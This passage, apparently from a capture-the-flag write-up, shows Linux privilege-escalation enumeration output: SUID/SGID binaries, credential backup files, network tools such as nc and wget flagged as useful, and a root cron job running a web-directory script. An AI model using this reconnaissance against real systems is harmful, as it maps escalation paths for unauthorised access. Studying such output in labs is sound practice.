lrwxrwxrwx 1 root root 36 Oct 20  2019 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Oct 20  2019 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Oct 20  2019 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Oct 20  2019 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Oct 20  2019 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Oct 20  2019 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Oct 20  2019 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Oct 20  2019 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Oct 20  2019 systemd-update-utmp.service -> ../systemd-update-utmp.service

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Oct 20  2019 alsa-restore.service -> ../alsa-restore.service
lrwxrwxrwx 1 root root 21 Oct 20  2019 alsa-state.service -> ../alsa-state.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Oct 20  2019 dbus.socket -> ../dbus.socket
lrwxrwxrwx 1 root root 25 Oct 20  2019 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Oct 20  2019 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Oct 20  2019 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Oct 20  2019 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Oct 20  2019 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Oct 20  2019 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Oct 20  2019 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 20  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Oct 20  2019 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jun 24  2019 debian.conf

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 20  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 20  2019 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Jun 24  2019 timeout.conf

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-generators:
total 220K
lrwxrwxrwx 1 root root  22 Oct 20  2019 netplan -> ../../netplan/generate
-rwxr-xr-x 1 root root 23K Jun 24  2019 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root 10K Jun 24  2019 systemd-debug-generator
-rwxr-xr-x 1 root root 31K Jun 24  2019 systemd-fstab-generator
-rwxr-xr-x 1 root root 14K Jun 24  2019 systemd-getty-generator
-rwxr-xr-x 1 root root 26K Jun 24  2019 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root 10K Jun 24  2019 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root 10K Jun 24  2019 systemd-rc-local-generator
-rwxr-xr-x 1 root root 10K Jun 24  2019 systemd-system-update-generator
-rwxr-xr-x 1 root root 31K Jun 24  2019 systemd-sysv-generator
-rwxr-xr-x 1 root root 14K Jun 24  2019 systemd-veritysetup-generator
-rwxr-xr-x 1 root root 286 Jun 21  2019 friendly-recovery
-rwxr-xr-x 1 root root 19K Jun  5  2019 snapd-generator

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root 219 Apr 29  2019 unattended-upgrades
-rwxr-xr-x 1 root root  92 Feb 22  2018 hdparm

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2


[-] MYSQL version:
mysql  Ver 15.1 Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2


[-] Apache version:
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2019-09-16T12:58:48


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Installed compilers:
ii  libllvm6.0:amd64                           1:6.0-1ubuntu2                               amd64        Modular compiler and toolchain technologies, runtime library
ii  libllvm8:amd64                             1:8-3~ubuntu18.04.1                          amd64        Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:amd64                        0.8.0-1ubuntu0.1                             amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 2548 Jul 14  2020 /etc/passwd
-rw-r--r-- 1 root root 947 Oct 21  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
-rw-r----- 1 root shadow 1442 Jul 14  2020 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping
-rwsr-xr-x 1 root root 59640 Mar 23  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40344 Mar 23  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 23  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 76496 Mar 23  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 75824 Mar 23  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-- 1 root dip 378600 Jun 12  2018 /usr/sbin/pppd
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 105336 Jun  5  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 10232 May  2  2019 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Oct 16  2018 /bin/umount
-rwsr-xr-x 1 root root 43088 Oct 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 23  2019 /bin/su
-rwsr-xr-x 1 root root 40152 Aug 23  2019 /snap/core/7917/bin/mount
-rwsr-xr-x 1 root root 44168 May  8  2014 /snap/core/7917/bin/ping
-rwsr-xr-x 1 root root 44680 May  8  2014 /snap/core/7917/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7917/bin/su
-rwsr-xr-x 1 root root 27608 Aug 23  2019 /snap/core/7917/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 11  2019 /snap/core/7917/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 May 16  2019 /snap/core/7270/bin/mount
-rwsr-xr-x 1 root root 44168 May  8  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44680 May  8  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2019 /snap/core/7270/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 11  2019 /snap/core/7270/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1880/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1880/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/1880/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1880/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/1880/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/1880/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/1880/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/1880/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/1880/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1880/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1880/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1754/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1754/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/1754/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1754/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/1754/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/1754/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/1754/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/1754/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/1754/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1754/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1754/usr/lib/openssh/ssh-keysign


[-] SGID files:
-rwxr-sr-x 1 root shadow 22808 Mar 23  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71816 Mar 23  2019 /usr/bin/chage
-rwxr-sr-x 1 root tty 30800 Oct 16  2018 /usr/bin/wall
-rwsr-sr-x 1 root root 105336 Jun  5  2019 /usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root mail 14336 May 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 10232 May  2  2019 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/7917/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/7917/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/7917/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  6  2016 /snap/core/7917/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/7917/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/7917/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7917/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7917/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7917/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/7917/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 Aug 23  2019 /snap/core/7917/usr/bin/wall
-rwsr-sr-x 1 root root 106696 Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  6  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  4  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 May 16  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /snap/core18/1880/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /snap/core18/1880/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71816 Mar 23  2019 /snap/core18/1880/usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 Mar 23  2019 /snap/core18/1880/usr/bin/expiry
-rwxr-sr-x 1 root crontab 362640 Mar  4  2019 /snap/core18/1880/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /snap/core18/1880/usr/bin/wall
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /snap/core18/1754/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /snap/core18/1754/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71816 Mar 23  2019 /snap/core18/1754/usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 Mar 23  2019 /snap/core18/1754/usr/bin/expiry
-rwxr-sr-x 1 root crontab 362640 Mar  4  2019 /snap/core18/1754/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /snap/core18/1754/usr/bin/wall


[+] Files with POSIX capabilities set:
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
-rw-r--r-- 1 root root 110 Oct 20  2019 /etc/kernel-img.conf
-rw-r--r-- 1 root root 7649 Aug  6  2019 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 3028 Aug  6  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 552 Apr  5  2018 /etc/pam.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 27 Jan 19  2018 /etc/libao.conf
-rw-r--r-- 1 root root 1308 Dec  2  2017 /etc/kerneloops.conf
-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 556 Aug  6  2019 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
-rw-r--r-- 1 root root 10368 Apr  6  2017 /etc/sensors3.conf
-rw-r--r-- 1 root root 2683 Jan 18  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 5898 Aug  6  2019 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 812 Mar 25  2018 /etc/mke2fs.conf
-rw-rw-r-- 1 root root 350 Oct 20  2019 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 191 Feb  8  2018 /etc/libaudit.conf
-rw-r--r-- 1 root root 1523 Mar  6  2018 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 769 Apr  4  2018 /etc/appstream.conf
-rw-r--r-- 1 root root 624 Aug  8  2007 /etc/mtools.conf
-rw-r--r-- 1 root root 25341 Aug 29  2018 /etc/brltty.conf
-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 433 Oct  2  2017 /etc/apg.conf
-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf


[-] Location and contents (if accessible) of .bash_history file(s):
/home/love/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 947 Oct 21  2019 /var/backups/group.bak
-rw------- 1 root shadow 1442 Jul 14  2020 /var/backups/shadow.bak
-rw------- 1 root root 2548 Jul 14  2020 /var/backups/passwd.bak
-rw------- 1 root shadow 787 Oct 21  2019 /var/backups/gshadow.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 www-data www-data 4096 Aug  6  2019 .
drwxr-xr-x 15 www-data www-data 4096 Oct 20  2019 ..


### SCAN COMPLETE ####################################
$ 

```

##### Cron Tabs
```javascript

[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

```

